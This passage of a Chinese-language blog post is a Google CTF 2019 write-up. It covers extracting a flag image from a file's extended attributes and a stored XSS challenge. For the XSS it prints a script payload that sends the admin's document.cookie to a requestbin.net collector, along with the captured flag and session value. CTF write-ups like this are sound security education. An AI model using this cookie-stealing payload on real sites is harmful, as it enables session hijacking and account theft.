<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 attr -l credentials.txt </span><br><span class="line">Attribute <span class="string">&quot;FILE0&quot;</span> has a 38202 byte value <span class="keyword">for</span> credentials.txt</span><br><span class="line">⚡ root@r10 attr -g  FILE0 -q credentials.txt &gt; flag</span><br><span class="line">⚡ root@r10 file flag</span><br><span class="line">flag: PNG image data, 1234 x 339, 8-bit/color RGB, non-interlaced</span><br></pre></td></tr></table></figure>

<ul>
<li>利用getfattr查看扩展文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 getfattr credentials.txt  </span><br><span class="line"><span class="comment"># file: credentials.txt</span></span><br><span class="line">user.FILE0</span><br><span class="line">⚡ root@r10 getfattr --only-values credentials.txt &gt; image.png</span><br></pre></td></tr></table></figure>

<ul>
<li>查看图片得到flag</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@r10 eog flag</span><br></pre></td></tr></table></figure>

<ul>
<li>==<strong>flag：CTF{congratsyoufoundmycreds}</strong>==</li>
</ul>
<h2 id="04-Government-Agriculture-Network-web"><a href="#04-Government-Agriculture-Network-web" class="headerlink" title="04 Government Agriculture Network(web)"></a>04 Government Agriculture Network(web)</h2><ul>
<li>目标页面<a target="_blank" rel="noopener" href="https://govagriculture.web.ctfcompetition.com/">https://govagriculture.web.ctfcompetition.com/</a></li>
<li>尝试Create a new post，得到信息：Your post was submitted for review. Administator will take a look shortly.</li>
<li>分析：administator再次登录将留下cookie，尝试xss攻击</li>
<li>利用<a target="_blank" rel="noopener" href="http://requestbin.net/">http://requestbin.net/</a> 构建requset.（hettp://webhook.site亦可）</li>
<li>Make a request to get started</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $result = file_get_contents(<span class="string">&#x27;http://requestbin.net/r/15ietu11&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>xss注入</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">location.href=<span class="string">&#x27;http://requestbin.net/r/14bfl601?test=&#x27;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看request信息，得到flag</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test: flag=CTF&#123;8aaa2f34b392b415601804c2f5f0f24e&#125;; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV</span><br></pre></td></tr></table></figure>

<ul>
<li>==<strong>flag：CTF{8aaa2f34b392b415601804c2f5f0f24e}</strong>==</li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2019/10/02/google_ctf_2019_stage1_writeup_2/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">goolge ctf 2019 stage1 writeup_part_2</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2019/09/15/google%20Chrome%20%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/">
                        <span class="hidden-mobile">google Chrome 插件推荐</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "goolge ctf 2019 stage1 writeup_part_1&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":170,"height":340},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
</html>
